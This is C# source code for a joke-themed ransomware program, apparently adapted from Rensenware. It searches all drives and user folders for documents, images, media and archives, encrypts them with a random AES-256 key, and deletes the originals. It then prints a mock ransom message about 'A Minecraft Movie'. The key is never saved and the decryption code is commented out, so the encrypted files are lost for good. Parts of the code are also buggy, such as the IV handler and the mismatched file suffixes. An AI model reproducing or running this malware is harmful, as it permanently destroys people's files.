using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Timers;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace jockeyWare
{
	internal class Program
	{
		// File extensions rensenware searches for
		private static readonly string[] targetExtensions = new string[]
		{
			".jpg",  ".txt",
			".png",  ".pdf",
			".hwp",  ".psd",
			".cs",   ".c",
			".cpp",  ".vb",
			".bas",  ".frm",
			".mp3",  ".wav",
			".flac", ".gif",
			".doc",  ".xls",
			".xlsx", ".docx",
			".ppt",  ".pptx",
			".js",   ".avi",
			".mp4",  ".mkv",
			".zip",  ".rar",
			".alz",  ".egg",
			".7z",   ".raw",
			".csv",  ".wma"
		};

		internal static List<string> encryptedFiles = new List<string>();
		
		internal static byte[] randomKey { get; set; }
		internal static readonly string KeyFilePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\randomkey.bin";

		internal static byte[] randomIV  { get; set; }
		internal static readonly string IVFilePath  = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\randomiv.bin";

		[STAThread]
		private static void Main()
		{
		    	Program.randomIV  = new byte[16];
			Program.randomKey = new byte[32];
			
			RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider();
			rngcryptoServiceProvider.GetBytes(Program.randomIV);  // Generate the IV
			rngcryptoServiceProvider.GetBytes(Program.randomKey); // Generate the key
			
			string[] logicalDrives = Environment.GetLogicalDrives();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
			foreach (string zeDrive in logicalDrives)
			{
				if (folderPath.Contains(zeDrive)) // Check if the drive has the windows system folder
				{	// We are most likely a windows drive, search the user's profile folder
					foreach (string path in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\.."))
					{
						try
						{
							foreach (string fileName in Directory.GetFiles(path, "*.*", SearchOption.AllDirectories))
							{
								foreach (string fileExt in Program.targetExtensions)
								{
									if (fileName.EndsWith(fileExt))
									{   // Encrypt the file
										Program.Crypt(fileName, false);
										Program.encryptedFiles.Add(fileName + ".RENSENWARE");
									}
								}
							}
						}
						catch
						{
						}
					}
				}
				else
				{
					foreach (string fileName in Directory.GetFiles(zeDrive))
					{
						try
						{
							foreach (string fileExt in Program.targetExtensions)
							{
								if (fileName.EndsWith(fileExt))
								{   // Encrypt the file
									Program.Crypt(fileName, false);
									Program.encryptedFiles.Add(fileName + ".RENSENWARE");
								}
							}
						}
						catch
						{
						}
					}

					// Search folders
					foreach (string zeFolders in Directory.GetDirectories(zeDrive))
					{
						try
						{
							foreach (string fileName in Directory.GetFiles(zeFolders, "*.*", SearchOption.AllDirectories))
							{
								foreach (string fileExt in Program.targetExtensions)
								{
									if (fileName.EndsWith(fileExt))
									{   // Encrypt the file
										Program.Crypt(fileName, false);
										Program.encryptedFiles.Add(fileName + ".CHICKENJOCKEY");
									}
								}
							}
						}
						catch
						{
						}
					}
				}
			}
			
			Console.WriteLine("Hello. I'm Steve and i just encrypted all your personal files!\nWatch \"A Minecraft Movie\" until the part where I yell \"CHICKEN JOCKEY!\" for me to decrypt them.");
			Console.WriteLine("Since I can't provide my own movie with this for bullshit reasons I'll set a timer and trust that you're gonna watch the minecraft movie while you wait.\nWhen the timer reaches zero (chicken jockey scene) your files will be decrypted.");
			Console.Write("Press any key to start the timer. ");
			Console.ReadKey();

			timmyr = new Timer(1000);
			timmyr.AutoReset = true;
			timmyr.Elapsed += onTimerElapse;
			timmyr.Start();
			Console.ReadLine();
			
			/*
			if (File.Exists(Program.KeyFilePath) && File.Exists(Program.IVFilePath))
			{
                                Program.randomKey = File.ReadAllBytes(Program.KeyFilePath);
                                if (Program.randomKey.Length == 32)
				{
                                        Program.randomIV = File.ReadAllBytes(Program.IVFilePath);
					if (Program.randomIV.Length == 16)
					{
                                                Application.Run(new frmManualDecrypter());
						return;
                                       }
                               }
                        }*/
		}

	        public static int countdown = 15;
                public static Timer timmyr;

                static void onTimerElapse(Object source, System.Timers.ElapsedEventArgs e)
                {
		        countdown--;
		        if(countdown < 1)
		        {
		                /*
                                if (File.Exists(Program.KeyFilePath) && File.Exists(Program.IVFilePath))
                                {
                                        Program.randomKey = File.ReadAllBytes(Program.KeyFilePath);
                                        if (Program.randomKey.Length == 32)
                                        {
                                                Program.randomIV = File.ReadAllBytes(Program.IVFilePath);
                                                if (Program.randomIV.Length == 16)
                                                {
                                                        Application.Run(new frmManualDecrypter());
                                                        return;
                                                }
                                        }
                                }*/
			        Console.WriteLine("CHICKEN JOCKEY!!!!!!");
			        timmyr.Stop();
			        Environment.Exit(0);
                        }
		        else
		        {
		                Console.WriteLine("\nTime left: " + countdown.ToString() + " seconds");
		        }
		}

		internal static void Crypt(string path, bool IsDecrypt = false)
		{
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				rijndaelManaged.IV          = Program.randomIV;
				rijndaelManaged.Key         = Program.randomKey;
				rijndaelManaged.KeySize     = 256;               // AES-256
				rijndaelManaged.BlockSize   = 128;
				rijndaelManaged.Mode        = CipherMode.CBC;    // CBC mode
				rijndaelManaged.Padding     = PaddingMode.PKCS7;

				ICryptoTransform transform = IsDecrypt ? rijndaelManaged.CreateDecryptor(Program.randomKey, Program.randomIV) : rijndaelManaged.CreateEncryptor(Program.randomKey, Program.randomIV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						byte[] fileData = File.ReadAllBytes(path);
						if ((long)fileData.Length >= 2147483647L) // 2 GB
						{
							while (cryptoStream.Position != (long)fileData.Length - 1L)
							{
								cryptoStream.Write(fileData, 0, 1);
							}
						}
						else
						{
							cryptoStream.Write(fileData, 0, fileData.Length);
						}
					}
                    
					// Create a seperate encrypted file, and delete the original one.
					File.WriteAllBytes(IsDecrypt ? path.Replace(".CHICKENJOCKEY", string.Empty) : (path + ".CHICKENJOCKEY"), memoryStream.ToArray());
					File.Delete(path);
				}
			}
		}
	}

	public partial class frmManualDecrypter
	{
		private byte[] Key;
		private byte[] IV;

		public frmManualDecrypter()
		{
			this.InitializeComponent();
		}

		private void ButtonKey_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Title  = "Open Key File",
				Filter = "Key/IV Binary File (*.bin)|*.bin"
			};

			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.KeyPath.Text = openFileDialog.FileName;
				this.Key = File.ReadAllBytes(openFileDialog.FileName);
				if (this.Key.Length != 32)
				{
					MessageBox.Show("Invalid Key File!");
				}
			}
			else
			{
				this.Key = null;
			}
			this.StartDecrypt.Enabled = (this.Key == null || this.IV == null);
		}

		private void StartDecrypt_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Title  = "Open Multiple Encrypted Files",
				Filter = "All (*.*)|*.*",
				Multiselect = true
			};

			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				string[] files = openFileDialog.FileNames;
				this.ProgressDecrypt.Value = 0;
				this.ProgressDecrypt.Maximum = files.Length;
				new Thread(delegate()
				{
					foreach (string fileName in files)
					{
						try
						{
							this.DecryptStatus.Invoke(new MethodInvoker(delegate()
							{
								this.DecryptStatus.Text = Path.GetFileName(fileName);
							}));

							Program.Crypt(fileName, true); // Decrypt the file
							
							this.ProgressDecrypt.Invoke(new MethodInvoker(delegate()
							{
								ProgressBar progressDecrypt = this.ProgressDecrypt;
								int value = progressDecrypt.Value;
								progressDecrypt.Value = value + 1;
							}));

							this.DecryptedList.Invoke(new MethodInvoker(delegate()
							{
								this.DecryptedList.Items.Add(fileName);
								this.DecryptedList.SelectedIndex = this.DecryptedList.Items.Count - 1;
							}));
						}
						catch
						{
							this.DecryptedList.Invoke(new MethodInvoker(delegate()
							{
								this.DecryptedList.Items.Add("FAIL : " + fileName);
								this.DecryptedList.SelectedIndex = this.DecryptedList.Items.Count - 1;
							}));
						}
					}
				}).Start();
			}
		}

		private void ButtonIV_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Title  = "Open IV File",
				Filter = "Key/IV Binary File (*.bin)|*.bin"
			};

			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.IVPath.Text = openFileDialog.FileName;
				this.Key = File.ReadAllBytes(openFileDialog.FileName);
				if (this.Key.Length != 16)
				{
					MessageBox.Show("Invalid IV File!");
				}
			}
			else
			{
				this.IV = null;
			}
			this.StartDecrypt.Enabled = (this.Key == null || this.IV == null);
		}
	}
}
